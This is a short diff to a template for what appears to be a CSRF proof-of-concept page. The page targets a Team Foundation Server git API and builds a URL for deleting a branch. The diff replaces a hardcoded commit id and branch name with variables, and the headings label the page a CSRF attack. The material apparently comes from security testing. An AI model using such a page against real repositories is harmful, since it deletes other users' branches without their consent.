@@ -7,10 +7,10 @@ block content
     h3 CSRF Form Post
 
   h3 CSRF attack against a controller that doesn't specify content type restriction
-  div.csrfContainer hello 
+  div.csrfContainer Hello Stranger!
   -
-    var oldObjectId = '9cf0e626d95c090e02e0dd6253f5e1cb27a5d201';
-    var name = 'refs/heads/deployment';
+    var oldObjectId = branchObjectId;
+    var name = branchName;
 
     var branchDeletionUrl = "https://{accountName}.me.tfsallin.net:444/_apis/git/Repositories/{repoId}/refs2?api-version=4.0-preview.1";
     branchDeletionUrl = branchDeletionUrl.replace(/{repoId}/g, repoId);
